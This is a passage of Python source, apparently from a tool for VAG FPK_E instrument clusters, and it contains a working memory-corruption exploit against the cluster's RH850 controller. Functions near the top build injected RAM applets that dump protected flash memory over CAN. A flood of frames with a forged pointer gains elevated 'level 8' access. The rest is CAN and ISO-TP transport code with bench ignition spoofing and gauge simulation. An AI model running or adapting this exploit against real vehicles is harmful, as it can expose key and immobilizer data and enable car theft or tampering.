    b.st_w(7, marker_addr - src_param, 14)
    b.mov_imm(caller_r29, 29)
    _emit_fpke_leave(b, caller_return=caller_return)
    payload = b.build()
    if len(payload) > 0x100:
        raise RuntimeError(f"FPK_E uflash buffer applet ({prof['name']}) size {len(payload)} exceeds 256-byte slot")
    return payload


def build_fpke_can_stream_applet(mode: str = "direct", *, profile: str = "83a") -> bytes:
    """Build RH850 SX RAM applet (`0xFEDF1800` on 83A / `0xFEDF4400` on 1703 & 1711) that streams memory on `0x6F1` via `RSCAN0` `TM17`.

    Parameters at `source_param` (`0xFEDF1900` on 83A / `0xFEDF4500` on 1703 & 1711):
      - `+0x00` (`u32` LE): `source_addr`
      - `+0x04` (`u32` LE): `frame_count` (number of 8-byte frames to transmit on `0x6F1`, e.g. 32 = 256 B)
    Modes:
      - `'direct'`: normal mapping (CodeFlash `0x00000000`, DataFlash `0xFF200000`, RAM)
      - `'bflash'`: switches `BFASELR = 1` before streaming and restores `BFASELR = 0` + I-cache/CDBCR afterwards
      - `'uflash'`: saves `MPM`, clears `MPE|SVP` before streaming, and restores `MPM` afterwards
    Uses only caller-saved registers `r6..r19` (`r20..r28` remain untouched) and returns cleanly to `caller_return`.
    """
    if mode not in ("direct", "bflash", "uflash"):
        raise ValueError(f"Unsupported stream applet mode: {mode}")
    prof = fpke_get_profile(profile)
    src_param = int(prof["source_param"])
    marker_addr = int(prof["marker_addr"])
    caller_r29 = int(prof["caller_r29"])
    caller_return = int(prof["caller_return"])

    b = _Rh850Builder()
    # 1. Save PSW into caller-saved r18 and disable interrupts (DI)
    _emit_fpke_enter(b)

    if mode == "bflash":
        b.mov_imm5(1, 6)
        b.jarl("SUB_SWITCH_BFLASH")
    elif mode == "uflash":
        # Save MPM (SR 0, sel 5) in caller-saved r19 and clear MPE|SVP during UFlash streaming
        b.stsr(0, 19, 5)
        b.andi(0xFFFC, 19, 6)
        b.ldsr(6, 0, 5)
        b.synci()
        b.syncp()

    # 2. Load source_addr (r8) and frame_count (r9) from source_param (kept in caller-saved r15)
    b.mov_imm(src_param, 15)
    b.ld_w(0, 15, 8)
    b.ld_w(4, 15, 9)

    # 3. Configure RSCAN0 Channel 1 TX buffer 1 (TM17, p = 17: TMIE17 == 0)
    b.movhi(0xFFD0, 0, 14)  # r14 = 0xFFD00000
    b.st_b(0, 0x02E1, 14)   # TMSTS17 = 0 (clear TMTRF)
    b.mov_u16(FPKE_STREAM_RX_ID, 6)
    b.st_w(6, 0x1110, 14)   # TMID17 = 0x6F1 (11-bit standard frame)
    b.movhi(0x8000, 0, 6)   # r6 = 0x80000000 (DLC = 8)
    b.st_w(6, 0x1114, 14)   # TMPTR17 = DLC 8

    # 4. Stream loop: write TMDF0/1_17, set TMC17.TMTR=1, wait TMSTS17 & 6 != 0, clear TMSTS17, ~30 us SLCAN gap
    b.label("FRAME_LOOP")
    b.ld_w(0, 8, 6)
    b.ld_w(4, 8, 7)
    b.st_w(6, 0x1118, 14)   # TMDF0_17
    b.st_w(7, 0x111C, 14)   # TMDF1_17
    b.mov_imm5(1, 6)
    b.st_b(6, 0x0261, 14)   # TMC17 = 1 (TMTR)

    b.movhi(0x0004, 0, 6)   # timeout counter r6 = 0x40000
    b.label("WAIT_TX")
    b.ld_bu(0x02E1, 14, 7)  # TMSTS17
    b.andi(0x0006, 7, 7)    # TMTRF bits 2:1
    b.bne_short("TX_DONE")
    b.add_imm5(-1, 6)
    b.bne_short("WAIT_TX")
    b.br_short("STREAM_END")

    b.label("TX_DONE")
    b.st_b(0, 0x02E1, 14)   # clear TMSTS17 (TMTRF := 00)
    # ~30 us inter-frame gap at 120 MHz (128 frames = 1 KiB finish in ~32 ms: 3.6x watchdog margin & zero SLCAN drops)
    b.mov_u16(1200, 6)
    b.label("TX_GAP")
    b.add_imm5(-1, 6)
    b.bne_short("TX_GAP")
    b.add_imm5(8, 8)
    b.add_imm5(-1, 9)
    b.bne_short("FRAME_LOOP")

    b.label("STREAM_END")
    b.st_b(0, 0x02E1, 14)
    # Persist auto-incremented next source_addr (r8) to source_param to eliminate per-chunk 0x3D parameter writes
    b.st_w(8, 0, 15)
    if mode == "bflash":
        b.mov_imm5(0, 6)
        b.jarl("SUB_SWITCH_BFLASH")
    elif mode == "uflash":
        b.ldsr(19, 0, 5)
        b.synci()
        b.syncp()

    # Write "SCAN" marker to marker_addr and return to caller_return with r29=caller_r29, r10=0, PSW=r18
    b.mov_imm(0x4E414353, 7)
    b.st_w(7, marker_addr - src_param, 15)
    b.mov_imm(caller_r29, 29)
    _emit_fpke_leave(b, caller_return=caller_return)

    if mode == "bflash":
        _emit_fpke_bfaselr_switch_subroutine(b, "SUB_SWITCH_BFLASH")

    payload = b.build()
    if len(payload) > 0x100:
        raise RuntimeError(f"FPK_E stream applet ({mode}) size {len(payload)} exceeds 256-byte slot")
    return payload


def flood_payload(index: int, *, profile: str = "83a") -> bytes:
    """Return 8-byte payload for block-stream frame `index` (0..1023), patching `pointer_frame` with `forged_ptr`."""
    prof = fpke_get_profile(profile)
    tpl = prof["template"]
    ptr_frame = int(prof["pointer_frame"])
    forged_ptr = int(prof["forged_ptr"])
    data = bytearray(tpl[index * 8 : index * 8 + 8])
    if len(data) != 8:
        raise ValueError(f"Invalid flood frame index: {index}")
    if index == ptr_frame:
        data[:4] = forged_ptr.to_bytes(4, "little")
    elif prof["name"] in ("1703", "1711") and index == ptr_frame - 1:
        data[4:8] = forged_ptr.to_bytes(4, "little")
    return bytes(data)


def fpke_level8_frames(profile: str = "83a") -> list[tuple[int, bytes]]:
    """The level-8 stream in send order: `ED[0..ptr-1]`, CanTp FF, `ED[ptr]` (forged pointer), CanTp CF (`[level] = 8`)."""
    ptr_frame = int(fpke_get_profile(profile)["pointer_frame"])
    frames = [(FPKE_BLOCK_ID, flood_payload(index, profile=profile)) for index in range(ptr_frame)]
    frames.append((FPKE_CF_CH9_ID, bytes.fromhex("1022800300000000")))
    frames.append((FPKE_BLOCK_ID, flood_payload(ptr_frame, profile=profile)))
    frames.append((FPKE_CF_CH9_ID, bytes([0x21, FPKE_REQUIRED_LEVEL, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA])))
    return frames


def partition_chunks(size: int, chunk: int) -> list[int]:
    """Split `size` into `chunk`-sized pieces (plus any remainder)."""
    if size <= 0 or chunk <= 0:
        raise ValueError(f"Invalid partition({size}, {chunk})")
    return [min(chunk, size - offset) for offset in range(0, size, chunk)]


def verify_fpke_self_tests() -> None:
    """Deterministic offline consistency checks for FPK_E templates, pointers, applets (83A / 1703 / 1711), and AES-128-CBC."""
    if len(FPKE_TEMPLATE) != 0x2000:
        raise RuntimeError(f"FPK_E template length mismatch: {len(FPKE_TEMPLATE)} != 8192")
    if hashlib.sha256(FPKE_TEMPLATE).hexdigest() != FPKE_TEMPLATE_SHA256:
        raise RuntimeError("FPK_E template SHA-256 mismatch")
    if len(FPKE_1703_TEMPLATE) != 0x2000:
        raise RuntimeError(f"FPK_E 1703 template length mismatch: {len(FPKE_1703_TEMPLATE)} != 8192")
    if hashlib.sha256(FPKE_1703_TEMPLATE).hexdigest() != FPKE_1703_TEMPLATE_SHA256:
        raise RuntimeError("FPK_E 1703 template SHA-256 mismatch")
    if FPKE_POINTER_FRAME != 1019 or FPKE_BLOCK_BUFFER + 8 * FPKE_POINTER_FRAME != FPKE_CANTP_CH9_PTR:
        raise RuntimeError("FPK_E CanTp channel-9 pointer frame calculation mismatch")
    if FPKE_1703_POINTER_FRAME != 964 or FPKE_1703_BLOCK_BUFFER + 8 * FPKE_1703_POINTER_FRAME != FPKE_1703_CANTP_PTR:
        raise RuntimeError("FPK_E 1703 CanTp channel-3 pointer frame calculation mismatch")
    if flood_payload(FPKE_POINTER_FRAME) != bytes.fromhex("0d31dffe00000000"):
        raise RuntimeError("FPK_E frame 1019 forged pointer bytes mismatch")
    if flood_payload(FPKE_1703_POINTER_FRAME, profile="1703") != bytes.fromhex("195adffee55adffe"):
        raise RuntimeError("FPK_E 1703 frame 964 forged pointer bytes mismatch")
    if len(FPKE_BFLASH_BUF_PAYLOAD) != 234 or hashlib.sha256(FPKE_BFLASH_BUF_PAYLOAD).hexdigest() != FPKE_BFLASH_BUF_PAYLOAD_SHA256:
        raise RuntimeError("FPK_E BFlash buffer applet SHA-256 mismatch")
    if len(FPKE_UFLASH_BUF_PAYLOAD) != 132 or hashlib.sha256(FPKE_UFLASH_BUF_PAYLOAD).hexdigest() != FPKE_UFLASH_BUF_PAYLOAD_SHA256:
        raise RuntimeError("FPK_E UFlash buffer applet SHA-256 mismatch")
    for prof_name, prof in FPKE_PROFILES.items():
        bf_app = build_fpke_bflash_buf_applet(prof_name)
        if not (64 <= len(bf_app) <= 256) or (prof_name == "83a" and len(bf_app) != 234):
            raise RuntimeError(f"Invalid BFlash buffer applet size for {prof_name}: {len(bf_app)}")
        uf_app = build_fpke_uflash_buf_applet(prof_name)
        if not (64 <= len(uf_app) <= 256):
            raise RuntimeError(f"Invalid UFlash buffer applet size for {prof_name}: {len(uf_app)}")
        for mode in ("direct", "bflash", "uflash"):
            stream_app = build_fpke_can_stream_applet(mode, profile=prof_name)
            if not (64 <= len(stream_app) <= 256):
                raise RuntimeError(f"Invalid stream applet size for {prof_name}/{mode}: {len(stream_app)}")
        for app_name, app_blob, max_sz in (
            (
                "dflash_bc",
                build_fpke_dflash_bc_applet(
                    applet_entry=prof["applet_entry"],
                    caller_return=prof["caller_return"],
                    caller_r29=prof["caller_r29"],
                ),
                256,
            ),
            (
                "dflash_write",
                build_fpke_dflash_write_applet(
                    applet_entry=prof["applet_entry"],
                    caller_return=prof["caller_return"],
                ),
                256,
            ),
            ("swresa_reset", build_fpke_swresa_reset_applet(), 64),
        ):
            if not (16 <= len(app_blob) <= max_sz):
                raise RuntimeError(f"Invalid {prof_name}/{app_name} applet size: {len(app_blob)} (max {max_sz})")
    chunks = partition_chunks(FPKE_DFLASH_SIZE, 500)
    if len(chunks) != 132 or sum(chunks) != FPKE_DFLASH_SIZE or chunks[-1] != 36:
        raise RuntimeError("FPK_E DFlash partition check failed")
    # NIST SP 800-38A AES-128-CBC vector
    key = bytes.fromhex("2b7e151628aed2a6abf7158809cf4f3c")
    iv = bytes.fromhex("000102030405060708090a0b0c0d0e0f")
    plain = bytes.fromhex("6bc1bee22e409f96e93d7e117393172aae2d8a571e03ac9c9eb76fac45af8e51")
    expected = bytes.fromhex("7649abac8119b246cee98e9b12e9197d5086cb9b507219ee95db113a917678b2")
    if aes128_cbc_encrypt(key, iv, plain) != expected:
        raise RuntimeError("FPK_E AES-128-CBC self-test failed")


def atomic_write(path: Path, data: bytes) -> None:
    """Atomically write `data` to `path` via a sibling temporary file."""
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    tmp_path: Path | None = None
    try:
        with tempfile.NamedTemporaryFile(dir=path.parent, prefix=path.name + ".", delete=False) as fh:
            tmp_path = Path(fh.name)
            fh.write(data)
        tmp_path.replace(path)
    finally:
        if tmp_path is not None and tmp_path.exists():
            with contextlib.suppress(OSError):
                tmp_path.unlink()


# ────────────────────────────── FPK_E CAN Transport Link ──────────────────────────────


class FpkeCanLink:
    """High-throughput CAN link for VAG FPK_E (11-bit UDS `0x714/0x77E`, 29-bit Continental `0x1BFCA2xx`, raw `0x6F1`).

    Uses the same tuned `python-can` + `_tune_slcan_bus` (256 KB RX buffer, bulk `in_waiting` reads, 1 ms Win32 timer,
    and ISO-TP `FlowControl` handling) as `J533CanLink`. Only native CAN interfaces (`slcan`, `gs_usb`, etc.) are
    permitted; D-PDU / J2534 wrappers are explicitly rejected.
    """

    UDS_TX_ID = FPKE_UDS_TX_ID
    UDS_RX_ID = FPKE_UDS_RX_ID
    STREAM_RX_ID = FPKE_STREAM_RX_ID

    def __init__(
        self,
        port: str,
        *,
        interface: str = "slcan",
        bitrate: int = 500_000,
        tty_baudrate: int = 115_200,
        log_path: Path | None = None,
        bus: Any | None = None,
        sw_profile: str | None = None,
        via_gateway: bool = False,
    ) -> None:
        if bus is None and not via_gateway and interface not in FPKE_NATIVE_INTERFACES:
            raise RuntimeError(
                tr(
                    f"Работа с приборной панелью FPK поддерживается только через нативный CAN-адаптер "
                    f"(CANable / SLCAN / candleLight). Интерфейс «{interface}» (VNCI / D-PDU / J2534) для FPK не поддерживается.",
                    f"FPK instrument cluster operations require a native CAN adapter (CANable / SLCAN / candleLight). "
                    f"Interface “{interface}” (VNCI / D-PDU / J2534) is not supported for FPK.",
                )
            )
        self.port = port
        self.interface = interface
        self.via_gateway = bool(via_gateway)
        self.sw_profile: str | None = sw_profile.strip().lower() if sw_profile else None
        self._explicit_sw_profile: str | None = self.sw_profile
        self._stack_profile_verified: bool = False
        self.is_closed = False
        self.level8_active = False
        self.tx_frames = 0
        self.rx_frames = 0
        self._t0 = time.monotonic()
        self._tx_lock = threading.Lock()
        self._history_lock = threading.Lock()
        self._log_lock = threading.Lock()
        self._history: list[tuple[float, str, int, bool, bytes]] = []
        self._rx_trace_suspended = 0
        self._log_file = None
        self._borrowed: Any = None
        self._keepalive_stop: threading.Event | None = None
        self._keepalive_thread: threading.Thread | None = None
        self._keepalive_started_at: float | None = None
        self._drive_stop: threading.Event | None = None
        self._drive_thread: threading.Thread | None = None
        self.sim_speed_kmh: float = 0.0
        self.sim_rpm: float = 800.0
        self.sim_temp_c: float = 90.0
        self.sim_auto_sweep: bool = True
        self._saved_coil_key_flags: tuple[int | None, int] | None = None
        # Set behind a J533 bridge driven by a slow adapter: sends the level-8 stream from the gateway itself, which
        # holds the stream built for `gateway_burst_profile`
        self.gateway_burst: Any = None
        self.gateway_burst_profile: str | None = None

        self.attach_log(log_path)

        if bus is not None:
            self.bus = bus
            self._owns_bus = False
        elif interface == "dpdu":
            from contitool.can import dpdu

            self._borrowed = dpdu.open_session(port or "", bitrate)
            self.bus = self._borrowed
            self._owns_bus = False
        elif interface == "j2534":
            from contitool.can.j2534 import J2534Bus

            self.bus = J2534Bus(port, bitrate)
            self._owns_bus = True
        else:
            kwargs: dict[str, Any] = {
                "interface": interface,
                "channel": port,
                "bitrate": bitrate,
                "timeout": 0.1,
            }
            if interface == "slcan":
                kwargs["tty_baudrate"] = tty_baudrate
            self.bus = can.interface.Bus(**kwargs)
            if interface == "slcan":
                _tune_slcan_bus(self.bus)
            self._owns_bus = True
        self._timer_held = _acquire_win_timer()

    def attach_log(self, log_path: Path | None) -> None:
        with self._log_lock:
            if self._log_file is not None:
                with contextlib.suppress(Exception):
                    self._log_file.close()
                self._log_file = None
            if log_path is not None:
                log_path.parent.mkdir(parents=True, exist_ok=True)
                self._log_file = log_path.open("a", encoding="utf-8", buffering=1)

    def close(self) -> None:
        self.is_closed = True
        self.level8_active = False
        self._stack_profile_verified = False
        self._saved_coil_key_flags = None
        self.stop_drive_simulation()
        self.stop_keepalive()
        if getattr(self, "_timer_held", False):
            _release_win_timer()
            self._timer_held = False
        if getattr(self, "_owns_bus", False) and getattr(self, "bus", None) is not None:
            with contextlib.suppress(Exception):
                self.bus.shutdown()
            self._owns_bus = False
        if getattr(self, "_borrowed", None) is not None:
            from contitool.can import dpdu

            dpdu.release_session(self._borrowed)
            self._borrowed = None
        with self._log_lock:
            if self._log_file is not None:
                with contextlib.suppress(Exception):
                    self._log_file.close()
                self._log_file = None

    def __enter__(self) -> FpkeCanLink:
        return self

    def __exit__(self, exc_type: Any, exc: Any, tb: Any) -> None:
        self.close()

    def _record_frame(self, direction: str, arb_id: int, extended: bool, data: bytes) -> None:
        rel_t = time.monotonic() - self._t0
        if not (direction == "rx" and self._rx_trace_suspended):
            with self._history_lock:
                self._history.append((rel_t, direction, arb_id, extended, data))
            with self._log_lock:
                if self._log_file is not None:
                    self._log_file.write(
                        json.dumps(
                            {
                                "time": time.time(),
                                "direction": direction,
                                "id": f"0x{arb_id:08X}" if extended else f"0x{arb_id:03X}",
                                "extended": extended,
                                "dlc": len(data),
                                "data": data.hex(),
                            }
                        )
                        + "\n"
                    )

    @contextlib.contextmanager
    def suspend_rx_trace(self) -> Iterator[None]:
        self._rx_trace_suspended += 1
        try:
            yield
        finally:
            self._rx_trace_suspended -= 1

    def write_stream_summary(self, address: int, expected: int, received: int, frames: int) -> None:
        with self._log_lock:
            if self._log_file is not None:
                self._log_file.write(
                    json.dumps(
                        {
                            "time": time.time(),
                            "direction": "rx_stream",
                            "id": f"0x{self.STREAM_RX_ID:03X}",
                            "address": f"0x{address:08X}",
                            "expected_bytes": expected,
                            "received_bytes": received,
                            "frames": frames,
                        }
                    )
                    + "\n"
                )

    def save_can_log(self, path: Path) -> None:
        """Save TX/RX frame history in the `audi-83a-keyless-can-access.md` `.can.log` text format."""
        with self._history_lock:
            history = list(self._history)
        lines = [
            f"{ts:.6f} {direction} {can_id:08X} {int(extended)} {len(data)} {data.hex()}"
            for ts, direction, can_id, extended, data in history
        ]
        atomic_write(path, ("\n".join(lines) + ("\n" if lines else "")).encode("utf-8"))

    # ── Keepalive background thread (0x3C0, 0x663, 0x585, 0x3BE) & bench controls ──

    def is_keepalive_running(self) -> bool:
        return self._keepalive_thread is not None and self._keepalive_thread.is_alive()

    def start_keepalive(self) -> None:
        if self.via_gateway or self.is_keepalive_running():
            return
        stop = threading.Event()
        self._keepalive_stop = stop
        if self._keepalive_started_at is None:
            self._keepalive_started_at = time.monotonic()

        def _loop() -> None:
            while not stop.is_set():
                for can_id, payload in FPKE_KEEPALIVE_PATTERN:
                    if stop.is_set():
                        break
                    if self.is_drive_simulation_running() and can_id in (0x3C0, 0x3BE):
                        continue
                    with contextlib.suppress(Exception):
                        self.send_frame(can_id, payload, extended=False)
                    if stop.wait(0.002):
                        break
                stop.wait(0.19)

        t = threading.Thread(target=_loop, name="fpke-keepalive", daemon=True)
        self._keepalive_thread = t
        t.start()

    def stop_keepalive(self) -> None:
        if self._keepalive_stop is not None:
            self._keepalive_stop.set()
        if self._keepalive_thread is not None:
            self._keepalive_thread.join(timeout=1.0)
        self._keepalive_stop = None
        self._keepalive_thread = None
        self._keepalive_started_at = None

    def set_kl15(self, enabled: bool) -> None:
        """Enable or disable periodic KL15 ignition broadcast (`0x3C0` + `0x663` + `0x585` + `0x3BE`)."""
        if self.via_gateway:
            raise RuntimeError(
                tr(
                    "Стендовая эмуляция зажигания KL15 (Komfort CAN) запрещена в режиме подключения через шлюз J533 (OBD).",
                    "Bench Komfort CAN KL15 ignition spoofing is not allowed when connected via J533 gateway (OBD).",
                )
            )
        if enabled:
            self.start_keepalive()
            with contextlib.suppress(Exception):
                self.send_frame(0x3C0, bytes.fromhex("00000300"), extended=False)
                self.send_frame(0x663, bytes.fromhex("0000000e00000000"), extended=False)
        else:
            self.stop_drive_simulation()
            self.stop_keepalive()
            for _ in range(3):
                with contextlib.suppress(Exception):
                    self.send_frame(0x3C0, bytes.fromhex("00000000"), extended=False)
                time.sleep(0.02)

    def send_mfl_button(self, code: int, event: int = 1, hold_s: float = 0.2) -> None:
        """Send a steering-wheel button press on `0x5BF` (`MFL_Tasten_Kon_01`) with `0x663` group-5 master supervision."""
        self.send_frame(0x663, bytes.fromhex("0000000e00000000"), extended=False)
        self.send_frame(0x5BF, bytes([code & 0xFF, 0x00, event & 0xFF, 0x00]), extended=False)
        if hold_s > 0:
            time.sleep(hold_s)
        self.send_frame(0x5BF, b"\x00\x00\x00\x00", extended=False)

    def is_drive_simulation_running(self) -> bool:
        return self._drive_thread is not None and self._drive_thread.is_alive()

    def set_drive_targets(
        self,
        *,
        speed_kmh: float | None = None,
        rpm: float | None = None,
        temp_c: float | None = None,
        auto_sweep: bool | None = None,
    ) -> None:
        if speed_kmh is not None:
            self.sim_speed_kmh = max(0.0, min(260.0, float(speed_kmh)))
        if rpm is not None:
            self.sim_rpm = max(0.0, min(7000.0, float(rpm)))
        if temp_c is not None:
            self.sim_temp_c = max(0.0, min(130.0, float(temp_c)))
        if auto_sweep is not None:
            self.sim_auto_sweep = bool(auto_sweep)

    def start_drive_simulation(self, *, auto_sweep: bool | None = None) -> None:
        """Start background gauge signal generator (`0x31B`, `0x107`, `0x640`, `0x647`, `0x040`) with E2E CRC8H2F."""
        if self.via_gateway:
            raise RuntimeError(
                tr(
                    "Стендовая симуляция движения и стрелок (Komfort CAN) запрещена в режиме подключения через шлюз J533 (OBD).",
                    "Bench Komfort CAN drive/gauge simulation is not allowed when connected via J533 gateway (OBD).",
                )
            )
        if auto_sweep is not None:
            self.sim_auto_sweep = bool(auto_sweep)
        if self.is_drive_simulation_running():
            return
        self.start_keepalive()
        stop = threading.Event()
        self._drive_stop = stop

        def _drive_loop() -> None:
            t0 = time.monotonic()
            tick = 0
            dist_m = 0.0
            prev_t = t0
            cnt: dict[int, int] = {cid: 0 for cid in (0x3C0, 0x31B, 0x0FD, 0x107, 0x3BE, 0x640, 0x647, 0x040, 0x65D)}
            while not stop.is_set():
                now = time.monotonic()
                dt = max(0.0, now - prev_t)
                prev_t = now
                if self.sim_auto_sweep:
                    phase = (now - t0) % 16.0
                    if phase < 6.0:
                        frac = phase / 6.0
                        spd = 120.0 * frac
                        rpm = 800.0 + 2700.0 * frac
                    elif phase < 10.0:
                        spd = 120.0
                        rpm = 3500.0
                    else:
                        frac = max(0.0, 1.0 - (phase - 10.0) / 6.0)
                        spd = 120.0 * frac
                        rpm = 800.0 + 2700.0 * frac
                    self.sim_speed_kmh = spd
                    self.sim_rpm = rpm
                else:
                    spd = self.sim_speed_kmh
                    rpm = self.sim_rpm
                dist_m += (spd / 3.6) * dt

                # 20 ms grid: 0x0FD & 0x107 every 20 ms; 0x31B & 0x040 every 40 ms; 0x3C0/0x3BE/0x640/0x647/0x65D every 100 ms
                due = [0x0FD, 0x107]
                if tick % 2 == 0:
                    due.extend([0x31B, 0x040])
                if tick % 5 == 0:
                    due.extend([0x3C0, 0x3BE, 0x640, 0x647, 0x65D])
                for cid in due:
                    if stop.is_set():
                        break
                    c = cnt[cid]
                    cnt[cid] = (c + 1) & 0x0F
                    frame = build_fpke_drive_frame(
                        cid,
                        c,
                        speed_kmh=spd,
                        rpm=rpm,
                        temp_c=self.sim_temp_c,
                        distance_m=dist_m,
                        kl15=True,
                    )
                    with contextlib.suppress(Exception):
                        self.send_frame(cid, frame, extended=False)
                tick += 1
                stop.wait(0.02)

        t = threading.Thread(target=_drive_loop, name="fpke-drive-sim", daemon=True)
        self._drive_thread = t
        t.start()

    def stop_drive_simulation(self) -> None:
        if self._drive_stop is not None:
            self._drive_stop.set()
        if self._drive_thread is not None:
            self._drive_thread.join(timeout=1.0)
        self._drive_stop = None
        self._drive_thread = None

    @contextlib.contextmanager
    def paused_keepalive(self) -> Iterator[None]:
        """Temporarily pause keepalive and drive simulation during time-critical bursts (`0x1BFCA2ED` or `0x6F1` streaming)."""
        was_ka = self.is_keepalive_running()
        was_drv = self.is_drive_simulation_running()
        if was_drv:
            self.stop_drive_simulation()
        if was_ka:
            self.stop_keepalive()
        try:
            yield
        finally:
            if was_ka:
                self.start_keepalive()
            if was_drv:
                self.start_drive_simulation()

    # ── Frame & ISO-TP I/O ──

    def drain_rx(self, max_frames: int = 128, *, quick: bool = False) -> int:
        slcan_port = getattr(self.bus, "serialPortOrig", None)
        port = slcan_port if quick else None
        parsed = getattr(self.bus, "_queue", None)
        raw_buf = getattr(self.bus, "_buffer", None)
        drained = 0
        polls = 0
        max_polls = max_frames * 4 + 128
        while drained < max_frames and polls < max_polls:
            polls += 1
            has_buf_line = isinstance(raw_buf, bytearray) and (13 in raw_buf or 7 in raw_buf)
            if (
                port is not None
                and callable(getattr(port, "in_waiting", None)) is False
                and not getattr(port, "in_waiting", 0)
                and not (parsed and parsed.qsize())
                and not has_buf_line
            ):
                break
            msg = self.bus.recv(timeout=0.0)
            if msg is None:
                still_queued = (
                    (isinstance(raw_buf, bytearray) and (13 in raw_buf or 7 in raw_buf))
                    or bool(parsed and parsed.qsize())
                    or bool(slcan_port is not None and getattr(slcan_port, "in_waiting", 0))
                )
                if still_queued:
                    continue
                break
            raw = bytes(msg.data)
            self.rx_frames += 1
            drained += 1
            if drained <= 32:
                self._record_frame("rx", msg.arbitration_id, bool(msg.is_extended_id), raw)
        return drained

    def send_frame(
        self,
        identifier: int,
        data: bytes | bytearray,
        *,
        extended: bool = False,
        pad: int | None = None,
    ) -> None:
        raw = bytes(data)
        if pad is not None and len(raw) < 8:
            raw += bytes([pad]) * (8 - len(raw))
        msg = can.Message(arbitration_id=identifier, data=raw, is_extended_id=extended)
        with self._tx_lock:
            self.bus.send(msg, timeout=FRAME_SEND_TIMEOUT)
            self.tx_frames += 1
        self._record_frame("tx", identifier, extended, raw)

    def receive_frame(
        self,
        identifier: int | None = None,
        *,
        extended: bool | None = None,
        timeout: float = 2.0,
    ) -> Any:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            wait = min(0.05, max(0.002, deadline - time.monotonic()))
            msg = self.bus.recv(timeout=wait)
            if msg is None:
                continue
            raw = bytes(msg.data)
            is_ext = bool(msg.is_extended_id)
            self.rx_frames += 1
            self._record_frame("rx", msg.arbitration_id, is_ext, raw)
            if identifier is not None and msg.arbitration_id != identifier:
                continue
            if extended is not None and is_ext != extended:
                continue
            return msg
        target = f"0x{identifier:X}" if identifier is not None else "any ID"
        raise TimeoutError(f"No CAN frame from {target} within {timeout:.1f}s")

    def receive_flow_control(self, timeout: float = 2.0) -> tuple[int, int]:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            msg = self.receive_frame(self.UDS_RX_ID, extended=False, timeout=max(0.05, deadline - time.monotonic()))
            if not msg.data:
                continue
            pci_type = msg.data[0] >> 4
            fc_status = msg.data[0] & 0x0F
            if pci_type == 3:
                if fc_status == 0:
                    bs = msg.data[1] if len(msg.data) > 1 else 0
                    st_min = msg.data[2] if len(msg.data) > 2 else 0
                    return bs, st_min
                if fc_status == 1:
                    continue
                raise RuntimeError(f"ISO-TP FlowControl Overflow/Abort from 0x{self.UDS_RX_ID:03X}: {bytes(msg.data).hex()}")
        raise TimeoutError(f"Timed out waiting for ISO-TP FlowControl from 0x{self.UDS_RX_ID:03X}")

    @staticmethod
    def _st_min_seconds(st_min: int) -> float:
        if 0x01 <= st_min <= 0x7F:
            return st_min / 1000.0
        if 0xF1 <= st_min <= 0xF9:
            return (st_min - 0xF0) / 10_000.0
        return 0.0

    def send_uds(self, uds_payload: bytes) -> None:
        """Send 11-bit UDS payload on `0x714` using SingleFrame or MultiFrame with `FlowControl` from `0x77E`."""
        payload = bytes(uds_payload)
        if not payload:
            raise ValueError("Empty UDS payload")
        length = len(payload)
        if length <= 7:
            self.send_frame(self.UDS_TX_ID, bytes([length]) + payload, extended=False, pad=0xAA)
            return
        self.send_frame(
            self.UDS_TX_ID,
            bytes([0x10 | ((length >> 8) & 0x0F), length & 0xFF]) + payload[:6],
            extended=False,
        )
        block_size, st_min = self.receive_flow_control()
        seq = 1
        offset = 6
        sent = 0
        delay = self._st_min_seconds(st_min)
        while offset < length:
            if delay == 0 and hasattr(self.bus, "send_batch"):
                limit = (block_size - (sent % block_size)) if block_size else ((length - offset + 6) // 7)
                batch: list[Any] = []
                while offset < length and len(batch) < limit:
                    chunk = payload[offset : offset + 7]
                    raw = bytes([0x20 | seq]) + chunk
                    if len(raw) < 8:
                        raw += b"\xaa" * (8 - len(raw))
                    msg = can.Message(arbitration_id=self.UDS_TX_ID, data=raw, is_extended_id=False)
                    self._record_frame("tx", self.UDS_TX_ID, False, raw)
                    batch.append(msg)
                    seq = (seq + 1) & 0x0F
                    offset += len(chunk)
                    sent += 1
                with self._tx_lock:
                    self.bus.send_batch(batch, timeout=BLOCK_SEND_TIMEOUT)
                    self.tx_frames += len(batch)
            else:
                chunk = payload[offset : offset + 7]
                self.send_frame(self.UDS_TX_ID, bytes([0x20 | seq]) + chunk, extended=False, pad=0xAA)
                seq = (seq + 1) & 0x0F
                offset += len(chunk)
                sent += 1
                if delay > 0 and offset < length:
                    time.sleep(delay)
            if block_size and sent % block_size == 0 and offset < length:
                block_size, st_min = self.receive_flow_control()
                delay = self._st_min_seconds(st_min)

    def receive_uds(self, timeout: float = 2.0) -> bytes:
        """Receive 11-bit UDS response on `0x77E` with strict sequence number and length validation."""
        deadline = time.monotonic() + timeout
        while True:
            rem = deadline - time.monotonic()
            if rem <= 0:
                raise TimeoutError(f"UDS response timeout ({timeout:.1f}s) on 0x{self.UDS_RX_ID:03X}")
            first = self.receive_frame(self.UDS_RX_ID, extended=False, timeout=rem)
            raw0 = bytes(first.data)
            if not raw0:
                continue
            kind = raw0[0] >> 4
            if kind == 0:
                sf_len = raw0[0] & 0x0F
                if sf_len == 0 or 1 + sf_len > len(raw0):
                    continue
                return raw0[1 : 1 + sf_len]
            if kind == 1:
                total = ((raw0[0] & 0x0F) << 8) | raw0[1]
                output = bytearray(raw0[2:])
                seq = 1
                self.send_frame(self.UDS_TX_ID, b"\x30\x00\x00", extended=False, pad=0xAA)
                while len(output) < total:
                    rem_cf = deadline - time.monotonic()
                    if rem_cf <= 0:
                        raise TimeoutError(
                            f"ISO-TP ConsecutiveFrame timeout on 0x{self.UDS_RX_ID:03X} ({len(output)}/{total} B)"
                        )
                    msg = self.receive_frame(self.UDS_RX_ID, extended=False, timeout=rem_cf)
                    cf = bytes(msg.data)
                    if not cf or (cf[0] >> 4) != 2:
                        raise RuntimeError(f"Expected ISO-TP ConsecutiveFrame on 0x{self.UDS_RX_ID:03X}, got: {cf.hex()}")
                    if (cf[0] & 0x0F) != (seq & 0x0F):
                        raise RuntimeError(
                            f"ISO-TP sequence error on 0x{self.UDS_RX_ID:03X}: expected {seq & 0x0F:X}, got {cf.hex()}"
                        )
                    output.extend(cf[1:])
                    seq += 1
                return bytes(output[:total])

